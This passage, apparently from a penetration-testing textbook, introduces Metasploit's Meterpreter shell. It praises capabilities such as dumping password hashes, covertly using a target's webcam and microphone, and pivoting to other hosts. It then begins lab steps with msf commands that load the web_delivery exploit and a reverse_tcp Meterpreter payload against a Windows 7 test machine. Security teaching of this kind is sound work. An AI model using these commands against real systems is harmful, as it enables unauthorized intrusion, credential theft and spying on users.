  md: "# Chapter 8\nMeterpreter Shell\n\nA Meterpreter shell is usually preferred\
    \ over a standard remote terminal shell. Meterpreter gives us a set of commands\
    \ and utilities that can be run to greatly aid in security testing. After a successful\
    \ exploit, a Meterpreter shell allows you to perform many different functions.\
    \ It is great for manipulating a target system, or even using the compromised\
    \ host to attack other hosts on the same network. Depending on what your goals\
    \ are, a Meterpreter Shell is usually the preferred choice. For example, when\
    \ using Meterpreter there are commands to pull the password hashes and gather\
    \ data & settings from the target. There are also some fun tools included in Meterpreter,\
    \ for example you can use the target's webcam, microphone, or even grab desktop\
    \ screenshots of what the user is working on. Using the built-in commands and\
    \ add-in modules, it is possible to have pretty much full control over the target\
    \ system.\n\nIn this section we will talk about the Meterpreter shell and some\
    \ of its basic features.\n\n# Basic Meterpreter Commands\n\nFor this chapter,\
    \ we will need a remote Meterpreter shell to our Windows 7 system. For simplicity\
    \ sake, we will use the Web Delivery exploit module the same way we did in the\
    \ previous chapter.\n\n> **Note:**\n\n*At the time of this book update, Windows\
    \ Defender has started detecting the Meterpreter WebDelivery Script and blocking\
    \ it. If you are running an updated version of defender, WebDelivery will not\
    \ work.*\n\nI will repeat the necessary steps below:\n\n+   1. Start Metasploit\
    \ Framework using the Quick launch button.\n2. At the msf prompt, enter the following\
    \ commands:\n    a. **use exploit/multi/script/web_delivery**\n    b. **set target\
    \ 2**\n    c. **set payload windows/meterpreter/reverse_tcp**"
